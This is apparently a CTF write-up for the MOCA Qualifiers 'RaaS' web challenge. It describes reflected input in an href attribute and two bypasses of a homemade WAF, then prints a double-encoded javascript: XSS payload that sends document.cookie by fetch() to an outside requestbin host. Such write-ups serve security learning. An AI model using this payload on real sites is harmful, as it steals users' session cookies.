---
title : "[WEB] MOCA Qualifiers RaaS"
date: 2024-07-22 00:00:00 +0800
categories: [CTF, Web, XSS]
tags: [CTF, Web, XSS]
---

# Raas
The website was simple, just a box with two parameters:
![alt text](/assets/RaaS/homepage.png)

Our input was reflected in this part of the html. Specifically in the href attribute.
![alt text](/assets/RaaS/image.png)

Inside an href attribute it is possible to execute javascript code using the directive ```javascript:```. However the flag was not that easy. An homemade WAF was put in place:
![alt text](/assets/RaaS/image-1.png)

Two bypasses are needed:

1) To bypass the regex double encoding the payload does the trick, [reference](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#special-protocols-within-the-attribute)
2) To bypass the second check, mutation points in \<a\> tag where needed, [reference](https://x.com/hackerscrolls/status/1273254212546281473?s=21)
## Final payload
```javascript
%02java%09script:%2528function%2528%2529%257Bfetch%2528%2527https%253A%252F%252Frequestbin%252Ekanbanbox%252Ecom%252Fxudpedxu%253Fcookie%253D%2527%252Bdocument%252Ecookie%2529%257D%2529%2528%2529
```
## Flag
```
PWNX{WH0_D035'N7_l0V3_4_g00D_0l'_W4F?}
```